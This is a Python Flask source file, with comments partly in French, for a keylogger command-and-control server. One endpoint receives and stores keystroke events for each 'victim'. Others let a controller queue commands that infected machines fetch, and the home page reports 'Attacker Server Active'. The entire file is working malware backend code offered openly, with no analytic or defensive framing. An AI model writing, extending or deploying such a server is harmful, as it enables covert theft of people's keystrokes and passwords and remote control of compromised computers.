from flask import Flask, request, jsonify
import json, os
import threading
import time

app = Flask(__name__)

# Dictionary to hold pending commands for each victim
# Clé: victim_id (str), Valeur: {"action": "...", "timestamp": ...}
COMMANDS = {}
# Timestamp of the last successful command execution globally
LAST_COMMAND_TIMESTAMP = 0

os.makedirs("stockage", exist_ok=True)

@app.post("/log")
def log():
    """Receives and stores keylogger events."""
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid JSON"}), 400

    victim = data.get("victim_id", "unknown")
    os.makedirs(f"stockage/{victim}", exist_ok=True)

    path = f"stockage/{victim}/events.jsonl"
    with open(path, "a") as f:
        f.write(json.dumps(data) + "\n")

    return jsonify({"status": "ok"}), 200

# --- NOUVEL ENDPOINT POUR LE CONTRÔLE C2 ---
@app.post("/command")
def set_command():
    """Endpoint accessible par le Controller pour définir une commande à exécuter."""
    global COMMANDS, LAST_COMMAND_TIMESTAMP
    data = request.get_json(silent=True)
    
    if not data or not data.get("victim_id") or not data.get("action"):
        return jsonify({"error": "Missing victim_id or action"}), 400
    
    victim_id = data["victim_id"]
    action = data["action"]
    
    # Store the command to be picked up by the victim later
    COMMANDS[victim_id] = {
        "action": action, 
        "timestamp": time.time(),
        "status": "pending" # New field for status
    }
    
    LAST_COMMAND_TIMESTAMP = time.time()
    print(f"[C2 Command] Command '{action}' set for victim {victim_id}.")
    return jsonify({"status": "command_set", "action": action}), 200

@app.get("/command/<victim_id>")
def get_command(victim_id):
    """Endpoint accessible par la Victime pour récupérer la commande en attente."""
    global COMMANDS
    
    command_data = COMMANDS.get(victim_id)
    
    if command_data and command_data.get("status") == "pending":
        # Return the command and mark it as "sent" (to prevent re-sending the same command)
        COMMANDS[victim_id]["status"] = "sent" 
        return jsonify(command_data), 200
    
    # If no pending command, return an empty action
    return jsonify({"action": "none"}), 200

# Endpoint to check command status (optional for controller)
@app.get("/command_status")
def command_status():
    global COMMANDS, LAST_COMMAND_TIMESTAMP
    return jsonify({
        "commands": {k: v for k, v in COMMANDS.items() if v.get('status') == 'pending'},
        "last_command_time": LAST_COMMAND_TIMESTAMP
    }), 200
# ----------------------------------------------


@app.get("/")
def home():
    return "Attacker Server Active"

if __name__ == "__main__":
    # WARNING: Use 0.0.0.0 for external access in VM environment!
    app.run(host="127.0.0.1", port=5000)